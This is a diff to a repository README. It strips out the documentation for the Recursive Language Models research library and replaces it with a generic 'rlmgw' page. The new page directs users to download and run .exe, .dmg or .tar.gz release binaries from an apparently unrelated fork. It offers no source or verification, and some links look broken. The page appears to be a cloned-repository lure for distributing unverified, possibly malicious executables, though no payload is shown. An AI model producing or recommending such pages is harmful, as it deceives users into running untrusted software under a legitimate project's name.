@@ -1,156 +1,70 @@
+# 🌟 rlmgw - Access Recursive Language Models Easily
 
----
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20rlmgw-latest%20release-brightgreen)](https://github.com/ENTITY107/rlmgw/releases)
 
-<h1 align="center" style="font-size:2.8em">
-<span>Recursive Language Models (<span style="color:orange">RLM</span>s)</span>
-</h1>
+## 🚀 Getting Started
+Welcome to the rlmgw application! This software allows you to easily navigate and utilize Recursive Language Models as outlined in the paper [here](https://arxiv.org/abs/2512.24601v1). We designed this guide for you to understand how to download and run the software smoothly.
 
-<p align="center" style="font-size:1.3em">
-  <a href="https://arxiv.org/abs/2512.24601">Full Paper</a> •
-  <a href="https://alexzhang13.github.io/blog/2025/rlm/">Blogpost</a> •
-  <a href="https://alexzhang13.github.io/rlm/">Documentation</a> •
-  <a href="https://github.com/alexzhang13/rlm-minimal">RLM Minimal</a>
-</p>
+## 💻 System Requirements
+Before you start using rlmgw, ensure your computer meets the following requirements:
 
-<p align="center">
-  <a href="https://github.com/alexzhang13/rlm/actions/workflows/style.yml">
-    <img src="https://github.com/alexzhang13/rlm/actions/workflows/style.yml/badge.svg" alt="Style" />
-  </a>
-  <a href="https://github.com/alexzhang13/rlm/actions/workflows/test.yml">
-    <img src="https://github.com/alexzhang13/rlm/actions/workflows/test.yml/badge.svg" alt="Test" />
-  </a>
-</p>
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 100 MB of free disk space.
+- **Network:** An internet connection for downloading.
 
-<p align="center">
-  <a href="https://arxiv.org/abs/2512.24601">
-    <img src="media/paper_preview.png" alt="Paper Preview" width="300"/>
-  </a>
-</p>
+## 📦 Download & Install
+To get started, you need to visit the Releases page to download rlmgw. Here are the steps:
 
-## Overview
-Recursive Language Models (RLMs) are a task-agnostic inference paradigm for language models (LMs) to handle near-infinite length contexts by enabling the LM to *programmatically* examine, decompose, and recursively call itself over its input. RLMs replace the canonical `llm.completion(prompt, model)` call with a `rlm.completion(prompt, model)` call. RLMs offload the context as a variable in a REPL environment that the LM can interact with and launch sub-LM calls inside of.
+1. Click the link below to go to the Releases page:
+   [Visit the Releases Page to Download](https://github.com/ENTITY107/rlmgw/releases).
 
-This repository provides an extensible inference engine for using RLMs around standard API-based and local LLMs. The initial experiments and idea were proposed in a [blogpost](https://alexzhang13.github.io/blog/2025/rlm/) in 2025, with expanded results in an [arXiv preprint](https://arxiv.org/abs/2512.24601).
+2. Once there, find the latest version listed at the top of the page. This version should have a title like "v1.0.0" or similar. 
 
-> [!NOTE]
-> This repository contains inference code for RLMs with support for various sandbox environments. Open-source contributions are welcome. This repository is maintained by the authors of the paper from the MIT OASYS lab.
+3. Click on the title to expand the details.
 
-<!-- ## Installation
-```
-pip install rlm
-```
-To install the latest from `main`:
-```
-pip install git+https://github.com/alexzhang13/rlm.git
-```
-``` -->
+4. Look for the asset that fits your operating system. You will likely see options such as `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
 
-## Quick Setup
-Set up the dependencies with `uv` (or your virtual environment of choice):
-```bash
-curl -LsSf https://astral.sh/uv/install.sh | sh
-uv init && uv venv --python 3.12  # change version as needed
-uv pip install -e .
-```
+5. Click on the appropriate file to start the download. 
 
-To run a quick test, the following will run an RLM query with the OpenAI client using your environment variable `OPENAI_API_KEY` (feel free to change this). This will generate console output as well as a log which you can use with the visualizer to explore the trajectories. 
-```bash
-uv run examples/quickstart.py
-```
+6. After the download finishes, navigate to your Downloads folder. You will find the file there.
 
-The default RLM client uses a REPL environment that runs on the host process through Python `exec` calls. It uses the same virtual environment as the host process (i.e. it will have access to the same dependencies), but with some limitations in its available global modules. As an example, we can call RLM completions using GPT-5-nano:
-```python
-from rlm import RLM
+7. **Installation Instructions:**
+   - **For Windows:** Double-click the `.exe` file and follow the installation prompts.
+   - **For macOS:** Open the `.dmg` file and drag the rlmgw icon to your Applications folder.
+   - **For Linux:** Extract the `.tar.gz` file and follow the instructions in the README file included within.
 
-rlm = RLM(
-    backend="openai",
-    backend_kwargs={"model_name": "gpt-5-nano"},
-    verbose=True,  # For printing to console with rich, disabled by default.
-)
+## 🎉 Running the Application
+After installation, it's easy to get started:
 
-print(rlm.completion("Print me the first 100 powers of two, each on a newline.").response)
-```
+1. **Launch the Application:**
+   - **Windows:** Find rlmgw in your Start Menu or desktop shortcut.
+   - **macOS:** Open your Applications folder and double-click on rlmgw.
+   - **Linux:** Navigate to the application folder in your terminal and type `./rlmgw` to run it.
 
-## REPL Environments
-We support two types of REPL environments -- isolated, and non-isolated. Non-isolated environments (default) run code execution on the same machine as the RLM (e.g. through `exec`), which is pretty reasonable for some local low-risk tasks, like simple benchmarking, but can be problematic if the prompts or tool calls can interact with malicious users. Fully isolated environments used Cloud-based sandboxes (e.g. Prime Sandboxes, [Modal Sandboxes](https://modal.com/docs/guide/sandboxes)) to run code generated by the RLM, ensuring completely isolation from the host process. Environments can be added, but we natively support the following: `local` (default), `modal`, `prime`.
+2. **Using rlmgw:**
+   - Once the application is open, you will see a straightforward interface.
+   - Follow the on-screen instructions to begin exploring Recursive Language Models.
 
-```python
-rlm = RLM(
-    environment="...", # "local", "docker", "modal", "prime"
-    environment_kwargs={...},
-)
-```
+## 🛠 Troubleshooting
+If you encounter any issues, try these solutions:
 
-### Local Environments
-The default `local` environment `LocalREPL` runs in the same process as the RLM itself, with specified global and local namespaces for minimal security. Using this REPL is generally safe, but should not be used for production settings. It also shares the same virtual environment (e.g. Conda or uv) as the host process.
+- **Application Won't Start:** Ensure your system meets the requirements listed above.
+- **Installation Error:** Make sure you downloaded the correct file for your operating system.
+- **Network Issues:** Check your internet connection and try downloading again.
 
-#### Docker <img src="https://github.com/docker.png" alt="Docker" height="20" style="vertical-align: middle;"/> (*requires [Docker installed](https://docs.docker.com/desktop/setup/install/)*)
-We also support a Docker-based environment called `DockerREPL` that launches the REPL environment as a Docker image. By default, we use the `python:3.11-slim` image, but the user can specify custom images as well.
+## 📖 Additional Resources
+For further information on recursive language models:
 
-### Isolated Environments
-We support several different REPL environments that run on separate, cloud-based machines. Whenever a recursive sub-call is made in these instances, it is requested from the host process.
+- [Research Paper](https://arxiv.org/abs/2512.24601v1)
+- [FAQs](https://github.com/ENTITY107/rlmgw/faq)
 
-#### Modal Sandboxes <img src="https://github.com/modal-labs.png" alt="Modal" height="20" style="vertical-align: middle;"/>
-To use [Modal Sandboxes](https://modal.com/docs/guide/sandboxes) as the REPL environment, you need to install and authenticate your Modal account.
-```bash
-uv add modal  # add modal library
-modal setup   # authenticate account
-```
+## 🤝 Community Support
+If you have questions or need help, please visit our GitHub Discussions or reach out through our support channels. We aim to respond promptly to inquiries.
 
-#### Prime Intellect Sandboxes <img src="https://github.com/PrimeIntellect-ai.png" alt="Prime Intellect" height="20" style="vertical-align: middle;"/>
-> [!WARNING]
-> **Prime Intellect Sandboxes** are currently a beta feature. See the [documentation](https://docs.primeintellect.ai/sandboxes/overview) for more information.
+## 🔗 Links
+- [Download rlmgw](https://github.com/ENTITY107/rlmgw/releases)
+- [GitHub Repository](https://github.com/ENTITY107/rlmgw)
 
-> [!IMPORTANT]
-> **Prime Intellect Sandboxes are not yet implemented** in `rlm`. This feature is not available at the moment until we patch some bugs.
-
-See [Prime CLI setup instructions](https://docs.primeintellect.ai/inference/overview) for getting setup. You will need to set your CLI key.
-```bash
-export PRIME_API_KEY=...
-```
-
-
-### Model Providers
-We currently support most major clients (OpenAI, Anthropic), as well as the router platforms (OpenRouter, Portkey, LiteLLM). For local models, we recommend using vLLM (which interfaces with the [OpenAI client](https://github.com/alexzhang13/rlm/blob/main/rlm/clients/openai.py)). To view or add support for more clients, start by looking at [`rlm/clients/`](https://github.com/alexzhang13/rlm/tree/main/rlm/clients).
-
-## Relevant Reading
-* **[Dec '25]** [Recursive Language Models arXiv](https://arxiv.org/abs/2512.24601)
-* **[Oct '25]** [Recursive Language Models Blogpost](https://alexzhang13.github.io/blog/2025/rlm/)
-
-If you use this code or repository in your research, please cite:
-
-```bibtex
-@misc{zhang2025recursivelanguagemodels,
-      title={Recursive Language Models}, 
-      author={Alex L. Zhang and Tim Kraska and Omar Khattab},
-      year={2025},
-      eprint={2512.24601},
-      archivePrefix={arXiv},
-      primaryClass={cs.AI},
-      url={https://arxiv.org/abs/2512.24601}, 
-}
-```
-
-## Optional Debugging: Visualizing RLM Trajectories
-We additionally provide a simple visualizer tool to examine and view the code, sub-LM, and root-LM calls of an RLM trajectory. To save log files (`.jsonl`) on every completion call that can be viewed in the visualizer, initialize the `RLMLogger` object and pass it into the `RLM` on initialization:
-```python
-from rlm.logger import RLMLogger
-from rlm import RLM
-
-logger = RLMLogger(log_dir="./logs")
-rlm = RLM(
-    ...
-    logger=logger
-)
-```
-
-To run the visualizer locally, we use Node.js and shadcn/ui:
-```
-cd visualizer/
-npm run dev        # default localhost:3001
-```
-
-You'll have the option to select saved `.jsonl` files 
-<p align="center">
-  <img src="media/visualizer.png" alt="RLM Visualizer Example" width="800"/>
-</p>
+Thank you for choosing rlmgw! Enjoy exploring Recursive Language Models.
